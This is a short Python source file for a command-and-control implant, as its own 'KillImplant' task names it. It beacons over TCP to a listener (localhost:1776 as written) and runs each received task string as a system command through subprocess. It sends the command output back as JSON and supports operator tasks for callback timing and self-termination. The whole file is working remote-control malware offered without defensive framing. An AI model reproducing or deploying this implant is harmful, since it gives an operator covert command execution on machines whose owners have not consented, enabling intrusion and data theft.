import socket
import sys
import json
import time
import uuid
import subprocess

uuid = str(uuid.uuid4())
MsgNum = 0
sleepytime = 0

def sleepy(sleeptime):
    time.sleep(sleeptime)

def admin(todo, value=0):
    if (todo == "ChangeTimer"):
        result = "Time Changed to " + str(value) + " hours"
    elif (todo == "ViewTimer"):
        result = "Current callback time is " + str(sleepytime * 60) + " hours"
    return result


def tojson(idnum, data):
    idnum = idnum + 1
    json_to_load = {"id": idnum, "name": uuid, "Type": "response", "data": data}
    NewMsg = json.dumps(json_to_load)
    return NewMsg


def GenMsg(x):
    if (x == 0):
        NewMsgJ = {"id": 0, "name": uuid, "Type": "init"}
        NewMsgD = json.dumps(NewMsgJ)
        NewMsg = str.encode(NewMsgD)
    else:
        reformat = x.split(" ")
        output = subprocess.Popen(
            reformat, stdout=subprocess.PIPE).communicate()[0]
        NewMsg = output.decode("utf-8")
    return NewMsg


Msg = GenMsg(MsgNum)


while True:
    HOST, PORT = "localhost", 1776
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((HOST, PORT))
        sock.sendall(Msg)
        print("Sending:     {}".format(Msg))

        received = sock.recv(1024)
        print("Recevied:    {}".format(received))
        raw_received = received.decode()
        receive = json.loads(raw_received)
        if (receive["task"] == "admin_tasker"):
            if ("value" in receive):
                MsgDraft = admin(receive["Type"], receive["value"])
                sleepytime = receive["value"] * 60
            else:
                MsgDraft = admin(receive["Type"])
            MsgJson = tojson(receive["id"], MsgDraft)
            Msg = str.encode(MsgJson)
        elif (receive["task"] == "admin_sleep"):
            time.sleep(sleepytime)
        elif (receive["task"] != "KillImplant"):
            MsgDraft = GenMsg(receive["task"])
            MsgJson = tojson(receive["id"], MsgDraft)
            Msg = str.encode(MsgJson)
        elif (receive["task"] == "KillImplant"):
            print("closing...")
            exit()
        else:
            exit()

    finally:
        sock.close()
    sleepy(sleepytime)
    continue

print("Closing...")
